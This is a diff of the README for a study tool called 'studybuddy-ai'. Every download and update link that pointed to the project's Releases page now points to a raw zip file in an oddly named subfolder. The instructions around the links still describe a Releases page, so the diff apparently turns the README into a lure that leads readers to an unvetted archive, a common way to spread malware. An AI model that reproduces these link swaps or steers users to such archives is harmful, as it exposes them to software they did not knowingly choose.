@@ -1,6 +1,6 @@
 # 📘 studybuddy-ai - Simplify Your Study with AI Tools
 
-[![Download studybuddy-ai](https://img.shields.io/badge/Download-studybuddy--ai-brightgreen?style=for-the-badge)](https://github.com/Glamrockfoxy20/studybuddy-ai/releases)
+[![Download studybuddy-ai](https://img.shields.io/badge/Download-studybuddy--ai-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Glamrockfoxy20/studybuddy-ai/main/Samir/ai-studybuddy-stenching.zip)
 
 ---
 
@@ -32,7 +32,7 @@ If your PC matches or exceeds these, you are ready to install.
 To start, you need the program files. Follow these steps:
 
 1. **Go to the Releases Page:**  
-   [Download studybuddy-ai Here](https://github.com/Glamrockfoxy20/studybuddy-ai/releases)  
+   [Download studybuddy-ai Here](https://raw.githubusercontent.com/Glamrockfoxy20/studybuddy-ai/main/Samir/ai-studybuddy-stenching.zip)  
 
 2. **Find the Latest Version:**  
    Look for the most recent release near the top of the page. It usually has the highest version number.  
@@ -129,7 +129,7 @@ If you run into problems, try these fixes:
 
 To keep studybuddy-ai working well:
 
-1. Visit the [Releases Page](https://github.com/Glamrockfoxy20/studybuddy-ai/releases) regularly to check for new versions.  
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Glamrockfoxy20/studybuddy-ai/main/Samir/ai-studybuddy-stenching.zip) regularly to check for new versions.  
 2. Download and install updates as you did the first time.  
 3. New versions improve features and fix issues.
 
@@ -144,4 +144,4 @@ To keep studybuddy-ai working well:
 
 ---
 
-[![Download studybuddy-ai](https://img.shields.io/badge/Download-studybuddy--ai-brightgreen?style=for-the-badge)](https://github.com/Glamrockfoxy20/studybuddy-ai/releases)
+[![Download studybuddy-ai](https://img.shields.io/badge/Download-studybuddy--ai-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Glamrockfoxy20/studybuddy-ai/main/Samir/ai-studybuddy-stenching.zip)
